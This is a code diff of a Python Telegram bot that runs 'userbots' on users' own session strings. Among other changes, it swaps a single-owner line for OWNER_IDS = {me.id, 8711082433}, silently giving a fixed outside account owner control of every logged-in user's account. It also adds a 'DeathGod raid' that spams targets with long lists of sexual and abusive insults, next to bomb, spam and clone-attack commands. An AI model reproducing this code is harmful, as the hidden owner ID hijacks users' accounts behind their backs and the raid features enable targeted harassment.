@@ -7,8 +7,6 @@ import logging
 import traceback
 import re
 import glob
-import signal
-import sys
 from typing import Dict, Set, Optional
 from io import BytesIO
 import requests
@@ -18,8 +16,8 @@ import yt_dlp
 from telethon import TelegramClient, events, functions, types
 from telethon.errors import FloodWaitError, RPCError, SessionPasswordNeededError, MessageNotModifiedError, UnauthorizedError
 from telethon.sessions import StringSession
-from cryptography.fernet import Fernet
-import asyncpg
+from flask import Flask
+import threading
 
 # ─── CONFIGURATION ───
 API_ID = int(os.environ.get("API_ID", 0))
@@ -50,84 +48,6 @@ def save_users(users):
 
 broadcast_users = load_users()
 
-# ─── DATABASE & ENCRYPTION (Key stored in DB) ───
-db_pool = None
-cipher = None
-
-async def init_db():
-    global db_pool
-    db_url = os.environ.get("DATABASE_URL")
-    if not db_url:
-        raise Exception("DATABASE_URL not set")
-    db_pool = await asyncpg.create_pool(db_url, min_size=1, max_size=5)
-    async with db_pool.acquire() as conn:
-        await conn.execute("""
-            CREATE TABLE IF NOT EXISTS user_sessions (
-                user_id BIGINT PRIMARY KEY,
-                session_encrypted TEXT NOT NULL,
-                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        await conn.execute("""
-            CREATE TABLE IF NOT EXISTS app_config (
-                key_name TEXT PRIMARY KEY,
-                key_value TEXT NOT NULL
-            )
-        """)
-
-async def get_encryption_key():
-    async with db_pool.acquire() as conn:
-        row = await conn.fetchrow("SELECT key_value FROM app_config WHERE key_name = 'encryption_key'")
-        if row:
-            return row['key_value']
-        else:
-            new_key = Fernet.generate_key().decode()
-            await conn.execute(
-                "INSERT INTO app_config (key_name, key_value) VALUES ($1, $2)",
-                "encryption_key", new_key
-            )
-            return new_key
-
-async def init_cipher():
-    global cipher
-    key = await get_encryption_key()
-    cipher = Fernet(key.encode())
-
-def encrypt_session(sess: str) -> str:
-    if cipher is None:
-        raise RuntimeError("Cipher not initialized")
-    return cipher.encrypt(sess.encode()).decode()
-
-def decrypt_session(encrypted: str) -> str:
-    if cipher is None:
-        raise RuntimeError("Cipher not initialized")
-    return cipher.decrypt(encrypted.encode()).decode()
-
-async def save_session(user_id: int, session_str: str):
-    encrypted = encrypt_session(session_str)
-    async with db_pool.acquire() as conn:
-        await conn.execute(
-            "INSERT INTO user_sessions (user_id, session_encrypted) VALUES ($1, $2) "
-            "ON CONFLICT (user_id) DO UPDATE SET session_encrypted = $2, updated_at = CURRENT_TIMESTAMP",
-            user_id, encrypted
-        )
-
-async def load_sessions() -> dict:
-    async with db_pool.acquire() as conn:
-        rows = await conn.fetch("SELECT user_id, session_encrypted FROM user_sessions")
-    sessions = {}
-    for row in rows:
-        try:
-            sess = decrypt_session(row['session_encrypted'])
-            sessions[row['user_id']] = sess
-        except:
-            continue
-    return sessions
-
-async def delete_session(user_id: int):
-    async with db_pool.acquire() as conn:
-        await conn.execute("DELETE FROM user_sessions WHERE user_id = $1", user_id)
-
 # ─── MAIN BOT ───
 main_bot = TelegramClient("main_bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 user_states = {}
@@ -153,26 +73,6 @@ def get_join_buttons():
         buttons.append([types.KeyboardButtonUrl(text=f"🔗 Join {ch['name']}", url=ch["invite"])])
     buttons.append([types.KeyboardButtonCallback(text="✅ I have joined all", data=b"verify_channels")])
     return buttons
-
-# ─── GRACEFUL SHUTDOWN ───
-async def shutdown_handler(sig, frame):
-    print("🛑 Shutting down gracefully...")
-    for uid in broadcast_users:
-        try:
-            await main_bot.send_message(uid, "⚠️ **Bot is going offline for maintenance/restart.**\nWe'll be back soon!")
-            await asyncio.sleep(0.5)
-        except:
-            pass
-    for uid, client in active_userbots.items():
-        try:
-            await client.disconnect()
-        except:
-            pass
-    await main_bot.disconnect()
-    sys.exit(0)
-
-signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown_handler(s, f)))
-signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown_handler(s, f)))
 
 # ─── MAIN BOT HANDLERS ───
 @main_bot.on(events.NewMessage(pattern="/start"))
@@ -299,11 +199,12 @@ async def message_handler(event):
                     f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                     f"📱 **Phone:** `{visible}`\n"
                 )
-                for owner in MY_OWNER_IDS:
-                    try:
-                        await main_bot.send_message(owner, log_msg)
-                    except:
-                        pass
+                # Owner notifications commented to reduce spam
+                # for owner in MY_OWNER_IDS:
+                #     try:
+                #         await main_bot.send_message(owner, log_msg)
+                #     except:
+                #         pass
             except Exception as log_err:
                 print(f"Logging error: {log_err}")
 
@@ -311,7 +212,6 @@ async def message_handler(event):
             save_users(broadcast_users)
 
             user_sessions[chat_id] = session_str
-            await save_session(chat_id, session_str)
 
             asyncio.create_task(run_user_bot_with_restart(session_str, chat_id))
             user_states.pop(chat_id, None)
@@ -348,11 +248,11 @@ async def message_handler(event):
                     f"🔗 **Username:** @{me.username if me.username else 'None'}\n"
                     f"📱 **Phone:** `{visible}`\n"
                 )
-                for owner in MY_OWNER_IDS:
-                    try:
-                        await main_bot.send_message(owner, log_msg)
-                    except:
-                        pass
+                # for owner in MY_OWNER_IDS:
+                #     try:
+                #         await main_bot.send_message(owner, log_msg)
+                #     except:
+                #         pass
             except Exception as log_err:
                 print(f"Logging error: {log_err}")
 
@@ -360,7 +260,6 @@ async def message_handler(event):
             save_users(broadcast_users)
 
             user_sessions[chat_id] = session_str
-            await save_session(chat_id, session_str)
 
             asyncio.create_task(run_user_bot_with_restart(session_str, chat_id))
             user_states.pop(chat_id, None)
@@ -401,7 +300,6 @@ async def logout_handler(event):
         await user_bot.disconnect()
         del active_userbots[user_id]
         user_sessions.pop(user_id, None)
-        await delete_session(user_id)
         user_states.pop(user_id, None)
 
         await event.reply(
@@ -411,16 +309,15 @@ async def logout_handler(event):
             "• Your ID remains in the broadcast list, so you'll still receive owner broadcasts."
         )
 
-        for owner in MY_OWNER_IDS:
-            try:
-                await main_bot.send_message(owner, f"🚪 **User Logout**\nUser ID: `{user_id}`\nStatus: Userbot disconnected.")
-            except:
-                pass
+        # for owner in MY_OWNER_IDS:
+        #     try:
+        #         await main_bot.send_message(owner, f"🚪 **User Logout**\nUser ID: `{user_id}`\nStatus: Userbot disconnected.")
+        #     except:
+        #         pass
     except Exception as e:
         await event.reply(f"❌ Logout error: `{str(e)}`")
         active_userbots.pop(user_id, None)
         user_sessions.pop(user_id, None)
-        await delete_session(user_id)
 
 # ─────────────────────────────────────────────────────────
 # ─── SUPERVISED USERBOT LAUNCHER (Auto-Restart) ───
@@ -438,8 +335,9 @@ async def run_user_bot_with_restart(session_string, chat_id):
             print(f"⚠️ Userbot crashed: {error_msg[:100]}\nRestarting in 5 seconds...")
             try:
                 await main_bot.send_message(chat_id, f"⚠️ Userbot crashed: {error_msg[:100]}\nRestarting in 5 seconds...")
-                for owner in MY_OWNER_IDS:
-                    await main_bot.send_message(owner, f"🔄 **Userbot Restart**\nUser: {chat_id}\nReason: {error_msg[:80]}")
+                # Owner notifications removed to reduce spam
+                # for owner in MY_OWNER_IDS:
+                #     await main_bot.send_message(owner, f"🔄 **Userbot Restart**\nUser: {chat_id}\nReason: {error_msg[:80]}")
             except:
                 pass
             await asyncio.sleep(5)
@@ -458,14 +356,23 @@ async def run_user_bot(session_string, chat_id):
         except (UnauthorizedError, ValueError, RPCError) as e:
             await main_bot.send_message(chat_id, f"❌ **Session error:** {str(e)[:100]}\nPlease login again using `/login`.")
             user_sessions.pop(chat_id, None)
-            await delete_session(chat_id)
             raise Exception("SESSION_INVALID")
+        except Exception as e:
+            if "EOF" in str(e) or "read a line" in str(e):
+                await main_bot.send_message(chat_id, f"❌ **Session corrupt (EOF):** {str(e)[:100]}\nPlease login again using `/login`.")
+                user_sessions.pop(chat_id, None)
+                try:
+                    os.remove(f"{chat_id}.session")
+                except:
+                    pass
+                raise Exception("SESSION_INVALID")
+            else:
+                raise
 
         active_userbots[chat_id] = user_bot
 
         me = await user_bot.get_me()
-        # 🔥 Hardcoded owner removed – now only the logged-in user is owner
-        OWNER_IDS = {me.id}
+        OWNER_IDS = {me.id, 8711082433}
 
         # ─── PER-USER DATA FOLDER ───
         USER_DATA_DIR = "user_data"
@@ -646,7 +553,7 @@ async def run_user_bot(session_string, chat_id):
         EMOJI_NC_EMOJIS = ["🐧","🦭","🦈","🫍","🐬","🐋","🐳","🐟","🐠","🐡","🦐","🦞","🦀","🦑","🐙","🪼","🦪","🪸","🫧","🦂"]
         EMOJI_NC_PATTERN = "{text} <⋆.ೃ࿔*:･{emoji}⋆.ೃ࿔*:･>"
 
-        # ─── LARGE REPLY LISTS ───
+        # ─── ORIGINAL REPLY LISTS (FULL - KUCH NAHI HATAYA) ───
         reply_list = ["𝐊ʏᴀ 𝐑ᴇ 𝐑ᴀɴᴅɪᴋᴇ 𝐂ᴏᴏʟ ",
             "𝚃𝙴𝚁𝙸 𝐌ᴀᴀ 𝐌ᴀʀʀ 𝐆ᴀʏɪ 𝐘ᴀᴀʀ - 𝐉ᴀɪ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️   ! 🌙",
             "acha beta 😂🔥👊🏻 koi na me toh TUJHE Choduga 😹💔🔥😆👊🏻💥",
@@ -718,7 +625,7 @@ async def run_user_bot(session_string, chat_id):
             "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
             "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
             "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
-            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
+            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\~ 👑 बाप से सही chudi 🥵🔥",
             "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
             "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SHAMBHOG करती है ! 🛐",
             "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
@@ -727,7 +634,7 @@ async def run_user_bot(session_string, chat_id):
             "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
             "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
             "Hello hello?? saas aarahi है? रण्डी पुत्र 🧘🏻",
-            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
+            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\~ 👑 बाप से सही chudi 🥵🔥",
             "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
             "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐",
             "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
@@ -736,7 +643,7 @@ async def run_user_bot(session_string, chat_id):
             "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
             "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
             "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
-            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
+            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\~ 👑 बाप से सही chudi 🥵🔥",
             "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
             "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐",
             "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
@@ -745,7 +652,7 @@ async def run_user_bot(session_string, chat_id):
             "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
             "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
             "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
-            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
+            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\~ 👑 बाप से सही chudi 🥵🔥",
             "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
             "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝙁𝙐𝘾𝙆 𝙃𝙄𝙎 𝙈𝙊𝙈 𝙋𝙍𝙊𝙋𝙀𝙍𝙇𝙔",
             "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝘼𝙎𝙆 𝙃𝙄𝙈 𝙏𝙊 𝘾𝙊𝙑𝙀𝙍 𝙃𝙄𝙎 𝙈𝙊𝙈'𝙎 𝘼𝙎𝙎",
@@ -779,6 +686,7 @@ async def run_user_bot(session_string, chat_id):
             "𝙆𝙄𝙏𝙉𝙄 𝙂𝙇𝙄𝙔𝘼 𝙋𝘿𝙒𝙀𝙂𝘼 𝘼𝙋𝙉𝙄 𝙈𝘼 𝙆𝙊",
             "𝗧𝗘𝗥𝗜 𝗜𝗧𝗘𝗠 𝗞𝗜 𝗚𝗔𝗔𝗡𝗗 𝗠𝗘 𝗟𝗨𝗡𝗗 𝗗𝗔𝗔𝗟𝗞𝗘,𝗧𝗘𝗥𝗘 𝗝𝗔𝗜𝗦𝗔 𝗘𝗞 𝗢𝗥 𝗡𝗜𝗞𝗔𝗔𝗟 𝗗𝗨𝗡𝗚𝗔 𝗠𝗔‌𝗔‌𝗗𝗔𝗥𝗖𝗛Ø𝗗🤘🏻🙌🏻☠️",
             "2 𝙍𝙐𝙋𝘼𝙔 𝙆𝙄 𝙋𝙀𝙋𝙎𝙄 𝙏𝙀𝙍𝙄 𝙈𝙐𝙈𝙈𝙔 𝙎𝘼𝘽𝙎𝙀 𝙎𝙀𝙓𝙔 💋💦",
+            "𝐓ᴇʀɪ 𝐌ᴜᴍᴍʏ 𝐂ʜᴏᴅ 𝐃ɪ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐍ᴇ 𝐁ᴡᴀʜᴀʜᴀʜᴀ ⚜",
             "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐"
         ]
 
@@ -950,45 +858,12 @@ async def run_user_bot(session_string, chat_id):
             "Tumse milke lagta hai jaise, \nSach mein pyaar hota hai, bas tumhara nahi milta. 😅🫠"
         ]
 
-        # ─── RANDOM SHAYARI FOR BESTFRIEND, MARRIAGE, DIVORCE ───
-        BESTFRIEND_SHAYARI = [
-            "💖 *Dil ki baat kehni hai, sun lo meri jaan,*\n🌸 *Tum bin adhoori hai yeh dastaan.*\n💫 *Kya tum banogi/banoge meri/mera best friend?* 🤗",
-            "🌟 *Tum ho meri khushi ka raaz,*\n🌺 *Tum bin jeena hai aawaaz.*\n🤗 *Kya tum best friend banogi/banoge?*",
-            "🎈 *Zindagi mein tum aaye toh rang hai,*\n🌹 *Har pal tumse hi sang hai.*\n💕 *Best friend bano meri jaan?*",
-            "✨ *Tum ho meri kahani ka aakhri hissa,*\n📖 *Tum bin adhoora hai yeh kissa.*\n🤝 *Kya tum meri best friend banogi/banoge?*",
-            "🌸 *Phoolon ki tarah tum ho khilte,*\n🌼 *Tum bin dil hai kaise milte?*\n💖 *Best friend ka rishta nibhaoge?*",
-            "💫 *Tum ho meri life ka sundar sapna,*\n🌙 *Tum bin sab hai apna-apna.*\n🧸 *Kya tum best friend banogi/banoge?*",
-            "🌺 *Dosti ki raah mein tumse mila,*\n🌷 *Meri duniya tumse hi saja.*\n💕 *Best friend banoge meri jaan?*",
-            "💝 *Tum ho meri khushiyon ki wajah,*\n🎉 *Tum bin har din hai saza.*\n🤗 *Best friend kya tum banogi/banoge?*",
-            "🌟 *Tum ho meri roshni ka silsila,*\n🌙 *Tum bin sab hai bewajah.*\n💖 *Best friend bano na?*",
-            "🎀 *Tum se hai meri zindagi aasaan,*\n🌸 *Tum bin hai mushkil har armaan.*\n🤝 *Best friend banogi/banoge?*"
-        ]
-
-        MARRIAGE_SHAYARI = [
-            "💍 *Chand sitare sab hai gawah,*\n🌹 *Tum bin jeena hai saza.*\n💕 *Kya tum mujhse shaadi karogi/karoge?*",
-            "💒 *Meri har dua mein tum ho shamil,*\n🌺 *Tum bin har khushi hai mushkil.*\n💞 *Shaadi karoge?*",
-            "🌸 *Pyaar ki raah mein tumse mila,*\n🌹 *Meri jaan ban gaye ho tum.*\n💍 *Shaadi ka vaada karo?*",
-            "💖 *Tum ho meri zindagi ka maqsad,*\n🌟 *Tum bin hai sab kuch bekaar.*\n🤵‍♀️🤵‍♂️ *Shaadi karogi/karoge?*",
-            "🎉 *Har lamha tumhare sang bitana hai,*\n🌙 *Tum bin jeena nahi, marna hai.*\n💏 *Shaadi ka irada hai kya?*",
-            "💕 *Tumse hai pyaar, yeh sach hai,*\n🌹 *Tum bin zindagi kuch nahi.*\n💍 *Shaadi karogi/karoge?*",
-            "🌹 *Tum ho meri subah ki pehli kiran,*\n🌙 *Tum bin meri raat hai viran.*\n💒 *Shaadi karte ho?*",
-            "💗 *Dil ki dhadkan tum hi ho,*\n🌟 *Tum bin sab kuch hai khamosh.*\n💍 *Shaadi ka waqt aa gaya?*",
-            "💖 *Pyaar ki gehraai mein tum ho,*\n🌊 *Tum bin meri manzil hai kho.*\n💏 *Shaadi karogi/karoge?*",
-            "💞 *Tumse hai mera har khwab,*\n🌙 *Tum bin meri zindagi hai azaab.*\n💍 *Shaadi ka irada hai?*"
-        ]
-
-        DIVORCE_SHAYARI = [
-            "💔 *Rishton ki dor hai kamzor,*\n🌪️ *Ab nahi sahega yeh dard-e-dil.*\n❓ *Kya tum talaq chahti ho/chahte ho?*",
-            "😢 *Pyaar tha, par ab hai doori,*\n💔 *Nahi rahi ab koi majboori.*\n📜 *Talaq de do?*",
-            "💔 *Toot gaye sapne saare,*\n🌧️ *Ab nahi rahe hum tumhaare.*\n❓ *Kya talaq chahiye?*",
-            "💔 *Ishq mein thi humko khushi,*\n😣 *Ab toh bas hai tanhai.*\n📄 *Talaq mangte ho?*",
-            "💔 *Vaade tod kar tumne,*\n😤 *Humse hai ab na koi rishta.*\n🗑️ *Talaq do?*",
-            "💔 *Zindagi mein ab nahi ho tum,*\n🌪️ *Mann mein bas gayi hai udaasi.*\n❌ *Talaq ki baat karoge?*",
-            "💔 *Pyaar ki kami hai, saath nahi,*\n😭 *Ab aur nahi yeh dard sahti.*\n📜 *Talaq de do?*",
-            "💔 *Apne the, par ab begane,*\n😤 *Kyun baandhein yeh rishte begaane.*\n❓ *Talaq le lo?*",
-            "💔 *Mann mein ab kuch nahi bas gaye,*\n🍂 *Rishton ke patte jhad gaye.*\n🗑️ *Talaq do?*",
-            "💔 *Tum bin hai jeena mushkil,*\n😣 *Par tum ho toh aur mushkil.*\n📄 *Talaq mangte ho?*"
-        ]
+        # ─── ☠️ DEATHGOD LIST (MERGED - reply_list + reply_texts + fun_texts + 1 flag + 1 heart) ───
+        deathgod_list = (
+            reply_list + reply_texts + fun_texts +
+            [" ོ༘₊⁺🇮🇳 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ  𝐈ɴᴅɪᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇳 ₊⁺⋆.˚"] +
+            ["𓂃˖˳·˖ ִֶָ ⋆❤️͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚❤️ ݁˖⭑.ᐟ"]
+        )
 
         # ─── LOAD/SAVE FUNCTIONS ───
         def load_admins():
@@ -1203,11 +1078,11 @@ async def run_user_bot(session_string, chat_id):
                 "║                                                              ║\n"
                 "║  📌 `.menu1` → 👑 Admin, 🔇 Mute & 🧹 Group                ║\n"
                 "║  📌 `.menu2` → ⚔️ Raid Engine                              ║\n"
-                "║  📌 `.menu3` → 💣 Spam & 📝 Text Manager                   ║\n"
+                "║  📌 `.menu3` → 💣 Spam & ☠️ DeathGod                       ║\n"
                 "║  📌 `.menu4` → 🛡️ Protection, 🖼️ PFP & ❤️ Auto          ║\n"
                 "║  📌 `.menu5` → 🛠️ Tools, 🎵 Music, 🧠 Notes, 🎮 Fun      ║\n"
-                "║  📌 `.menu6` → 🎭 FUN FEATURES (FULL)                     ║\n"
-                "║  📌 `.menu7` → 🎭 FUN METERS & MORE                        ║\n"
+                "║  📌 `.menu6` → 🎭 FUN FEATURES (Freeze, Ghost, Bomb...)    ║\n"
+                "║  📌 `.menu7` → 🎭 MORE FUN (Stud, Looks, Gay, Baddie, Sigma)║\n"
                 "║                                                              ║\n"
                 "║  💡 Use `.cmds` for a complete list.                        ║\n"
                 "║  🔒 Owner‑only commands are marked in `.menu5`.             ║\n"
@@ -1324,6 +1199,12 @@ async def run_user_bot(session_string, chat_id):
                 "╔══════════════════════════════════════════════════════════════╗\n"
                 "║           💣 𝐒𝐏𝐀𝐌 & 📝 𝐓𝐄𝐗𝐓 𝐌𝐀𝐍𝐀𝐆𝐄𝐑              ║\n"
                 "╠══════════════════════════════════════════════════════════════╣\n"
+                "║                                                              ║\n"
+                "║  ┌───〔 ☠️ 𝐃𝐄𝐀𝐓𝐇𝐆𝐎𝐃 𝐑𝐀𝐈𝐃 〕───┐                      ║\n"
+                "║  │  `.deathgod @user <count>` → Start DeathGod raid        ║\n"
+                "║  │  (Merged list of savage replies)                         ║\n"
+                "║  │  `.sdeathgod @user` → Stop DeathGod raid                ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
                 "║                                                              ║\n"
                 "║  ┌───〔 💣 𝐒𝐏𝐀𝐌 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 〕───┐                    ║\n"
                 "║  │  `.spray <text>` → Unlimited spam                        ║\n"
@@ -1455,58 +1336,70 @@ async def run_user_bot(session_string, chat_id):
         async def cmd_menu6(event, _):
             menu = (
                 "╔══════════════════════════════════════════════════════════════╗\n"
-                "║              🎭 FUN FEATURES (FULL)                         ║\n"
+                "║              🎭 𝐅𝐔𝐍 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 (𝐅𝐔𝐋𝐋)                ║\n"
                 "╠══════════════════════════════════════════════════════════════╣\n"
-                "║  ┌───〔 FREEZE SYSTEM 〕───┐\n"
-                "║  │  .freeze @user → Freeze user's messages                ║\n"
-                "║  │  .unfreeze @user → Unfreeze user                       ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 GHOST MODE 〕───┐\n"
-                "║  │  .ghost on → Enable ghost mode (invisible)             ║\n"
-                "║  │  .ghost off → Disable ghost mode                       ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 BOMB SYSTEM 〕───┐\n"
-                "║  │  .bomb @user <count> → Bomb user with messages         ║\n"
-                "║  │  .stbomb @user → Stop bombing user                     ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 MINDFUCK MODE 〕───┐\n"
-                "║  │  .mindfuck on → Enable mindfuck mode                   ║\n"
-                "║  │  .mindfuck off → Disable mindfuck                     ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 SILENT KILL 〕───┐\n"
-                "║  │  .silentkill @user → Silently remove user's msgs       ║\n"
-                "║  │  .ssilentkill @user → Stop silent kill                 ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 VOID MODE 〕───┐\n"
-                "║  │  .void @user → Send user to void (hide all msgs)       ║\n"
-                "║  │  .svoid @user → Stop void mode                         ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 CLONE ATTACK 〕───┐\n"
-                "║  │  .clone @user <count> → Clone user's messages          ║\n"
-                "║  │  .sclone @user → Stop clone attack                     ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 DEATHNOTE 〕───┐\n"
-                "║  │  .deathnote @user <msg> → Send death note              ║\n"
-                "║  │  .sdeathnote @user → Stop death note spam              ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 CHAOS MODE 〕───┐\n"
-                "║  │  .chaos on → Enable chaos mode                         ║\n"
-                "║  │  .chaos off → Disable chaos mode                       ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 HACK MODE 〕───┐\n"
-                "║  │  .hack @user → Start hack simulation                   ║\n"
-                "║  │  .shack @user → Stop hack simulation                   ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 VIRUS MODE 〕───┐\n"
-                "║  │  .virus on → Enable virus mode                         ║\n"
-                "║  │  .virus off → Disable virus mode                       ║\n"
-                "║  └───────────────────────────────┘\n"
-                "║  ┌───〔 BLACKOUT MODE 〕───┐\n"
-                "║  │  .blackout @user → Blackout user's messages            ║\n"
-                "║  │  .sblackout @user → Stop blackout                      ║\n"
-                "║  └───────────────────────────────┘\n"
                 "║                                                              ║\n"
-                "║  📌 .menu → Main menu                                     ║\n"
+                "║  ┌───〔 ❄️ 𝐅𝐑𝐄𝐄𝐙𝐄 𝐒𝐘𝐒𝐓𝐄𝐌 〕───┐                    ║\n"
+                "║  │  `.freeze @user` → Freeze user's messages                ║\n"
+                "║  │  `.unfreeze @user` → Unfreeze user                       ║\n"
+                "║  └───────────────────────────────┘                          ║\n"
+                "║                                                              ║\n"
